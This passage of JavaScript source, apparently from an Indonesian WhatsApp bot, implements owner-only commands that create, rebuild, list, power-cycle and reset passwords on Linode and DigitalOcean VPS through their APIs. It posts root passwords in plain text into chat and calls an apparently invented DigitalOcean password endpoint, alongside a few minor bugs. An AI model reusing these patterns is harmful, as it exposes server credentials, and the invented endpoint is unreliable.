      rafatharcodereply(`Terjadi kesalahan: ${error.message}`);
    }
  }

  sisalinodeHandler();
  break;
}

case 'rebuildlinode': {
  if (!isOwner) return onlyOwn();

  let linodeId = args[0];
  if (!linodeId) return rafatharcodereply('ID Linode belum diberikan.');

  let password = args[1]; // Mengambil password dari argumen kedua (jika ada)
  if (!password) return rafatharcodereply('Password belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild VPS menggunakan API Linode
      const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/rebuild`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        },
        body: JSON.stringify({
          image: 'linode/ubuntu20.04', // Ganti dengan ID atau label image yang ingin digunakan untuk rebuild
          root_pass: password // Menggunakan password yang diberikan
        })
      });

      if (response.ok) {
        rafatharcodereply('Rebuild VPS berhasil dimulai.');

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const ipAddress = vpsData.ipv4[0] || 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: Ubuntu 20.04\nPASSWORD: ${password}`;
          await sleep(60000);
          rafatharcode.sendMessage(m.chat, { text: textvps });
        } else {
          rafatharcodereply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        rafatharcodereply('Gagal melakukan rebuild VPS:', errorData.errors[0].reason);
      }
    } catch (error) {
      rafatharcodereply('Terjadi kesalahan saat melakukan rebuild VPS:', error.message);
    }
  };

  rebuildVPS();
  break;
}

case 'linode8gb': {
  if (!isOwner) return onlyOwn();
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-4', // Spesifikasi 8GB RAM 4 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      rafatharcodereply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await rafatharcode.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    rafatharcodereply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

case 'linode16gb': {
  if (!isOwner) return onlyOwn();
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south',
      type: 'g6-standard-8',
      image: 'linode/ubuntu20.04',
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      rafatharcodereply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await rafatharcode.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    rafatharcodereply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

case 'cekvpslinode': {
  if (!isOwner) return onlyOwn();

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  // Mendapatkan informasi VPS Linode berdasarkan ID
  const getLinodeInfo = async (linodeId) => {
    try {
      const apiUrl = `https://api.linode.com/v4/linode/instances/${linodeId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.ok) {
        const linodeInfo = await response.json();

        const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode
        const ram = `${linodeInfo.specs.memory / 1024} GB`; // RAM VPS dalam GB
        const os = linodeInfo.image.distribution; // Nama OS
        const cpu = `${linodeInfo.specs.vcpus} vCPUs`; // Jumlah vCPUs
        const storage = linodeInfo.specs.disk; // Kapasitas penyimpanan
        const status = linodeInfo.status; // Status VPS

        const createDate = new Date(linodeInfo.created); // Tanggal pembuatan VPS
        const formattedCreateDate = createDate.toLocaleDateString();

        return {
          linodeid: linodeInfo.id,
          label: linodeInfo.label,
          ip: ipAddress,
          ram,
          os,
          cpu,
          storage,
          status,
          createDate: formattedCreateDate
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail Linode: ${errorData.errors[0].reason}`);
      }
    } catch (error) {
      throw new Error(`Terjadi kesalahan saat memeriksa detail Linode: ${error.message}`);
    }
  };

  getLinodeInfo(linodeId)
    .then((info) => {
      let textku = `*DETAIL VPS LINODE*\nLinode Id: ${info.linodeid}\nLabel: ${info.label}\nIP: ${info.ip}\nRAM: ${info.ram}\nOS: ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus: ${info.status}\nCreate On: ${info.createDate}\n`;
      rafatharcode.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      rafatharcode.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS Linode.' });
    });

  break;
}

case 'linode2gb': {
  if (!isOwner) return onlyOwn();
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-1', // Spesifikasi 1GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      rafatharcodereply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await rafatharcode.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    rafatharcodereply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

case 'linode4gb': {
  if (!isOwner) return onlyOwn();
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-2', // Spesifikasi 2GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      rafatharcodereply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await rafatharcode.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    rafatharcodereply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

case 'saldolinode':
  if (!isOwner) return onlyOwn();

  // Endpoint untuk mengambil informasi saldo promosi Linode
  const linodePromotionsEndpoint = 'https://api.linode.com/v4/profile';

  // Konfigurasi untuk melakukan permintaan ke API Linode
  const config = {
    headers: {
      'Authorization': `Bearer ${LINODE_API_TOKEN}`
    }
  };

  // Mengambil informasi saldo promosi dari Linode
  axios.get(linodePromotionsEndpoint, config)
    .then(response => {
      // Periksa apakah saldo promosi tersedia dalam respons
      if (response.data && Array.isArray(response.data.data)) {
        // Saldo promosi dapat ada dalam elemen pertama jika ada
        const saldoPromosi = response.data.data[0].balance;
        const teksSaldo = `Sisa Kredit Promosi Linode Dalam Akun Anda Adalah $${saldoPromosi}`;
        rafatharcodereply(teksSaldo);
      } else {
        rafatharcodereply('Informasi saldo promosi tidak ditemukan atau akun tidak memiliki saldo promosi.');
      }
    })
    .catch(error => {
      console.error(error);
      rafatharcodereply('Terjadi kesalahan saat mengambil informasi saldo promosi.');
    });

  break;

case 'resetpassword': {
  if (!isOwner) return onlyOwn();
  let linodeId = args[0];
  let newPassword = args[1];
  
  if (!linodeId || !newPassword) {
    return rafatharcodereply("Format: !resetpassword [Linode ID] [New Password]");
  }
  
  // Periksa apakah kata sandi memenuhi persyaratan keamanan yang diharapkan
  if (newPassword.length < 8) {
    return rafatharcodereply("Kata sandi harus memiliki setidaknya 8 karakter.");
  }
  
  try {
    const resetPassword = async () => {
      try {
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/password`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          },
          body: JSON.stringify({ root_pass: newPassword })
        });
        
        if (response.ok) {
          rafatharcodereply(`Kata sandi VPS Linode ID ${linodeId} berhasil direset.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal mereset kata sandi VPS Linode: ${responseData.errors[0].reason}`);
        }
      } catch (error) {
        rafatharcodereply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${error}`);
      }
    };
    
    resetPassword();
  } catch (err) {
    console.error(err);
    rafatharcodereply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${err}`);
  }
}
break;

case 'listlinode': {
  if (!isOwner) return onlyOwn();

  try {
    const getLinodes = async () => {
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });
        const data = await response.json();
        return data.data || [];
      } catch (error) {
        rafatharcodereply('Error fetching Linodes: ' + error);
        return [];
      }
    };

    getLinodes().then(linodes => {
      let totalvps = linodes.length;
      let message = `List VPS Linode Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (linodes.length === 0) {
        message += 'Tidak ada VPS yang tersedia.';
      } else {
        linodes.forEach(linode => {
          message += `- Linode Id: ${linode.id}\n- Label: ${linode.label}\n- Region: ${linode.region}\n- IP: ${linode.ipv4[0]}\n- Ram: ${linode.specs.memory / 1024} GB\n- Cpu: ${linode.specs.vcpus} CPU\n- Status: ${linode.status}\n- Harga: $\n▬▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      rafatharcode.sendMessage(m.chat, { text: message });
    });
  } catch (err) {
    rafatharcodereply('Terjadi kesalahan saat mengambil data Linode: ' + err);
  }

  break;
}

case 'offlinode': {
  if (!isOwner) return onlyOwn();
  
  let linodeId = args[0];
  if (!linodeId) return rafatharcodereply('ID Linode belum diberikan.');

  async function turnOffLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        rafatharcodereply('VPS (Linode) sedang dimatikan...');
      } else {
        rafatharcodereply('Gagal mematikan VPS (Linode).');
      }
    } catch (error) {
      rafatharcodereply('Terjadi kesalahan saat mematikan VPS (Linode):', error.message);
    }
  }

  turnOffLinode();
  break;
}

case 'onlinode': {
  if (!isOwner) return onlyOwn();
  
  let linodeId = args[0];
  if (!linodeId) return rafatharcodereply('ID Linode belum diberikan.');

  async function turnOnLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/boot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang diaktifkan...');
      } else {
        rafatharcodereply('Gagal mengaktifkan VPS (Linode).');
      }
    } catch (error) {
      rafatharcodereply('Terjadi kesalahan saat mengaktifkan VPS (Linode):', error.message);
    }
  }

  turnOnLinode();
  break;
}

case 'rebootlinode': {
  if (!isOwner) return onlyOwn();
  
  let linodeId = args[0];
  if (!linodeId) return rafatharcodereply('ID Linode belum diberikan.');

  async function rebootLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/reboot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        rafatharcodereply('VPS (Linode) sedang direboot...');
      } else {
        rafatharcodereply('Gagal me-reboot VPS (Linode).');
      }
    } catch (error) {
      rafatharcodereply('Terjadi kesalahan saat me-reboot VPS (Linode):', error.message);
    }
  }

  rebootLinode();
  break;
}

case 'changeapilinode' :
if (!isOwner) return onlyOwn()
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.apilinode = `${text}`
rafatharcodereply("Berhasil Mengganti Token Api Linode ✅")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix}changeapilinode *<TOKEN-API>*`)
}
break


// === Digital Ocean

case 'cvps': {
  if (!isOwner) return onlyOwn()
  let t = text.split(',');
if (t.length < 4) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}cvps hostname,region,osversi,ram`)

    let hostname = t[0];
    let regions = t[1];
    let ram = t[2];
    let osvps = t[3];
    
  try {
    let dropletData = {
      name: hostname,
      region: regions,
      size: ram,
      image: osvps,
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['RafatharCode']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + apido
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      rafatharcodereply(`\`\`\`Tunggu Sebentar...\`\`\``);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + apido
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `*\`VPS berhasil dibuat √\`*\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n\n`;
      
      messageText += `*\`SPEKTIFIKASI\`*\n\n`;
      
      messageText += `HOSTNAME: ${hostname}\n`;
      messageText += `REGION: ${regions}\n`;
      messageText += `RAM: ${ram}\n`;
      messageText += `OS + VERSI: ${osvps}\n`;

      await rafatharcode.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    rafatharcodereply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case 'changeapido' :
if (!isOwner) return onlyOwn()
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
global.apido = `${text}`
rafatharcodereply('Berhasil Mengganti Token Api Do ✅')
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix}changeapido *<TOKEN-API>*`)
}
break
case 'cekakunv1':
      if (!isOwner) return onlyOwn()
        

      const getAccountInfo = async () => {
        try {
          const response = await fetch('https://api.digitalocean.com/v2/account', {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${apido}`
            }
          });

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          const data = await response.json();
          return data;
        } catch (error) {
          console.error('Error fetching account info:', error);
          return null;
        }
      };

      const getPasswordInfo = async () => {
        try {
          const response = await fetch('https://api.digitalocean.com/v2/account/password', {  // Adjust endpoint as necessary
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${apido}`
            }
          });

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          const data = await response.json();
          return data;
        } catch (error) {
          console.error('Error fetching password info:', error);
          return null;
        }
      };

      const accountInfo = await getAccountInfo();
      const passwordInfo = await getPasswordInfo();

      if (accountInfo && passwordInfo) {
        const account = accountInfo.account;
        const password = passwordInfo.password;  // Adjust according to actual response structure
        const responseText = `
Account Info:
Name: ${account.name}
Email: ${account.email}
Droplet Limit: ${account.droplet_limit}
Floating IP Limit: ${account.floating_ip_limit}
Status: ${account.status}
Team Name: ${account.team.name}
Password: ${password}
        `;
        rafatharcodereply(responseText);
      } else {
        rafatharcodereply('Failed to fetch account or password info');
      }
break
case 'cekakunv2': {
    if (!isOwner) return rafatharcodereply(msg.owner)

    const getAccountInfo = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/account', {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${apido}`
          }
        });

        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }

        const data = await response.json();
        return data;
      } catch (error) {
        console.error('Error fetching account info:', error);
        return null;
      }
    };

    getAccountInfo()
      .then((accountInfo) => {
        if (accountInfo) {
          const account = accountInfo.account;
          const responseText = `
Account Info:
Name: ${account.name}
Email: ${account.email}
Droplet Limit: ${account.droplet_limit}
Floating IP Limit: ${account.floating_ip_limit}
Status: ${account.status}
Team Name: ${account.team.name}
          `;
          rafatharcodereply(responseText);
        } else {
          rafatharcodereply('Failed to fetch account info');
        }
      })
      .catch((err) => {
        rafatharcodereply(`Error: ${err.message}`);
      });
    break;
  }
break 
case 'cvpsubuntuv1': {
if (!isOwner ) return onlyOwn()
let teksnya = `Create Vps Do Os ubuntu V1 `
let sections = [{
title: '# UBUNTU 20.04',
highlight_label: 'Ubuntu 20.04',
rows: [{
title: 'VPS 1 GB 1 CORE',
description: `1GB 1C  Os Ubuntu 20 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-1gb,ubuntu-20-04-x64'
},
{
title: 'VPS 2 GB 1 CORE',
description: `2GB 1C  Os Ubuntu 20 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-2gb,ubuntu-20-04-x64'
},
{
title: 'VPS 4 GB 2 CORE',
description: `4GB 2C  Os Ubuntu 20 Region Sg`, 
id: '.cvps root,sgp1,s-2vcpu-4gb,ubuntu-20-04-x64'
},
{
title: 'VPS 8 GB 4 CORE',
description: `8GB 4C  Os Ubuntu 20 Region Sg`, 
id: '.cvps root,sgp1,s-4vcpu-8gb,ubuntu-20-04-x64'
}]
},
{
title: '# UBUNTU 22.04', 
highlight_label: 'System Information',
rows: [{
title: 'VPS 1 GB 1 CORE',
description: `1GB 1C  Os Ubuntu 22 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-1gb,ubuntu-22-04-x64'
},
{
title: 'VPS 2 GB 1 CORE',
description: `2GB 1C  Os Ubuntu 22 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-2gb,ubuntu-22-04-x64'
},
{
title: 'VPS 4 GB 2 CORE',
description: `4GB 2C  Os Ubuntu 22 Region Sg`, 
id: '.cvps root,sgp1,s-2vcpu-4gb,ubuntu-22-04-x64'
},
{
title: 'VPS 8 GB 4 CORE',
description: `8GB 4C  Os Ubuntu 22 Region Sg`, 
id: '.cvps root,sgp1,s-4vcpu-8gb,ubuntu-22-04-x64'
    }]
     }]
let listMessage = {
    title: 'List Vps Ubuntu', 
    sections
};

let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./rafathar/owner.jpg")}, { upload: rafatharcode.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'cvpsubuntuv2': {
if (!isOwner) return onlyOwn()
let teksnya = `Create Vps Do Os Ubuntu V2`
let sections = [{
title: '# UBUNTU 20.04',
highlight_label: 'Ubuntu 20.04',
rows: [{
title: 'VPS 1 GB 1 CORE',
description: `1GB 1C Os Ubuntu 20 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-1gb,ubuntu-20-04-x64'
},
{
title: 'VPS 2 GB 1 CORE',
description: `2GB 1C Os Ubuntu 20 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-2gb,ubuntu-20-04-x64'
},
{
title: 'VPS 4 GB 2 CORE',
description: `4GB 2C Os Ubuntu 20 Region Sg`, 
id: '.cvps root,sgp1,s-2vcpu-4gb,ubuntu-20-04-x64'
},
{
title: 'VPS 8 GB 4 CORE',
description: `8GB 4C Os Ubuntu 20 Region Sg`, 
id: '.cvps root,sgp1,s-4vcpu-8gb,ubuntu-20-04-x64'
},
{
title: 'VPS 16 GB 4 CORE',
description: `16GB 4C Os Ubuntu 20 Region Nyc3`, 
id: '.cvps root,nyc3,s-4vcpu-16gb-amd,ubuntu-20-04-x64'
}]
},
{
title: '# UBUNTU 22.04', 
highlight_label: 'System Information',
rows: [{
title: 'VPS 1 GB 1 CORE',
description: `1GB 1C Os Ubuntu 22 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-1gb,ubuntu-22-04-x64'
},
{
title: 'VPS 2 GB 1 CORE',
description: `2GB 1C Os Ubuntu 22 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-2gb,ubuntu-22-04-x64'
},
{
title: 'VPS 4 GB 2 CORE',
description: `4GB 2C Os Ubuntu 22 Region Sg`, 
id: '.cvps root,sgp1,s-2vcpu-4gb,ubuntu-22-04-x64'
},
{
title: 'VPS 8 GB 4 CORE',
description: `8GB 4C Os Ubuntu 22 Region Sg`, 
id: '.cvps root,sgp1,s-4vcpu-8gb,ubuntu-22-04-x64'
},
{
title: 'VPS 16 GB 4 CORE',
description: `16GB 4C Os Ubuntu 22 Region Nyc3`, 
id: '.cvps root,nyc3,s-4vcpu-16gb-amd,ubuntu-22-04-x64'
}]
},
{
title: '# UBUNTU 24.04', 
highlight_label: 'System Information',
rows: [{
title: 'VPS 1 GB 1 CORE',
description: `1GB 1C Os Ubuntu 24 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-1gb,ubuntu-24-04-x64'
},
{
title: 'VPS 2 GB 1 CORE',
description: `2GB 1C Os Ubuntu 24 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-2gb,ubuntu-24-04-x64'
},
{
title: 'VPS 4 GB 2 CORE',
description: `4GB 2C Os Ubuntu 24 Region Sg`, 
id: '.cvps root,sgp1,s-2vcpu-4gb,ubuntu-24-04-x64'
},
{
title: 'VPS 8 GB 4 CORE',
description: `8GB 4C Os Ubuntu 24 Region Sg`, 
id: '.cvps root,sgp1,s-4vcpu-8gb,ubuntu-24-04-x64'
},
{
title: 'VPS 16 GB 4 CORE',
description: `16GB 4C Os Ubuntu 24 Region Nyc3`, 
id: '.cvps root,nyc3,s-4vcpu-16gb-amd,ubuntu-24-04-x64'
}]
 }]
let listMessage = {
    title: 'List Vps Ubuntu V2', 
    sections
};

let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./rafathar/owner.jpg")}, { upload: rafatharcode.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'sisadroplet': {
if (!isOwner) return onlyOwn
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${apido}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${apido}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isOwner) {
return onlyOwn()
}

const dropletInfo = await getDropletInfo();
reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
break;
}

case 'deldroplet': {
if (!isOwner) return onlyOwn()
let dropletId = args[0];
